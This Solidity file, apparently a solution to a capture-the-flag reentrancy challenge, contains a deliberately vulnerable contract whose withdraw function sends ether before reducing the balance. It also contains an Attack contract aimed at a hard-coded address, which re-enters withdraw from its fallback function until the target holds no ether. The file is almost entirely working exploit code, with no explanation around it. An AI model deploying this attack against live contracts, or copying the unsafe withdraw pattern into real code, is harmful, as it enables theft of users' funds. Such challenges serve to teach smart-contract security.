// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to]+msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attack{
    
    Reentrance public owner = Reentrance(0xacdaed08b9ea3C3fEe9cdA620884806dA14A9139);
    uint public amount = 1 ether;

    constructor() public payable { 
    }

    function donate() public {
        owner.donate(address(this));
    }

    fallback() external payable{
        if (address(owner).balance != 0 ) {
            owner.withdraw(amount); 
        }
    }
    receive() external payable {}


}